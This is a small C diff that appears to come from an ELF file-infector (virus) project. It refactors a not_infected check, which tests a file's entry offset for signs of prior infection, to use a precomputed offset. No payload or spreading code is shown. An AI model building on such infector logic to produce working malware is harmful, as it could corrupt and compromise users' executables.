@@ -46,8 +46,7 @@ static bool	check_infected_entry(struct safe_ptr file_ref, size_t entry_offset)
 bool		not_infected(const struct entry *file_entry,
 			struct safe_ptr file_ref)
 {
-	const Elf64_Off	sh_offset    = file_entry->safe_shdr->sh_offset;
-	const size_t	entry_offset = sh_offset + file_entry->offset_in_section;
+	const size_t	entry_offset = file_entry->entry_offset;
 
 	if (!check_infected_entry(file_ref, entry_offset)
 	|| !check_infected_jump(file_ref, entry_offset))
